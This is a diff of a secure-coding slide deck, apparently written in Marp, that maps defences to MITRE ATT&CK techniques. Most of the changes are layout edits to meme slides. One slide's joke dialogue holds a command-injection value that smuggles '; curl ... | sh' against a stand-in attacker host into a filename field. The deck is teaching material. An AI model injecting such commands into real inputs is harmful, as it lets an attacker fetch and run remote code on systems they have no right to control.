@@ -280,11 +280,14 @@ The gate is not a vibe. It is a control surface.
 
 - No token? **401.**
 - Wrong role? **403.**
-- Weird payload? **Rejected before business logic.**
-- Too many guesses? **Rate-limited and logged.**
+- Weird payload? **Rejected**
+- Too many tries? **Rate-limited, logged.**
 - Valid account from impossible travel? **Challenge it.**
 
-**ATT&CK lens:** T1078 valid accounts, T1110 brute force, T1190 exposed app exploitation
+**ATT&CK lens:** 
+- T1078 valid accounts
+- T1110 brute force
+- T1190 exposed app exploitation
 
 </div>
 </div>
@@ -381,15 +384,11 @@ class CredentialStuffingDetector {
 
 ## I Cast Fireball at the Input Field
 
-<div class="columns">
-<div>
+![bg left:40%](./img/memes/cast-fireball.jpg)
 
-![h:430](./img/memes/cast-fireball.jpg)
-
-</div>
-<div>
 
 ```text
+
 Developer: We validate filename length.
 Attacker:  I cast ; curl https://evil.example/loader | sh
 Shell:     That is technically a second spell.
@@ -400,9 +399,6 @@ Shell:     That is technically a second spell.
 - The blast radius is now the process identity
 
 **ATT&CK lens:** T1059 — Command and Scripting Interpreter
-
-</div>
-</div>
 
 <!-- The joke is not that attackers are wizards; it is that shells are dangerous interpreters. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. -->
 ---
@@ -640,13 +636,7 @@ public class FileUploadValidator {
 
 ## Secrets Management: A Choice
 
-<div class="columns">
-<div>
-
-![w:100%](./img/memes/drake.jpg)
-
-</div>
-<div>
+![bg left:20%](./img/memes/drake.jpg)
 
 | ❌ Drake disapproves | ✅ Drake approves |
 |---|---|
@@ -656,8 +646,6 @@ public class FileUploadValidator {
 
 **ATT&CK lens:** T1552 — Unsecured Credentials
 
-</div>
-</div>
 
 <!-- This is the Drake format without the image. The teaching point is simple: credentials in code create T1552 exposure, while identity-based access and scoped authorization remove static secrets from the application path. -->
 ---
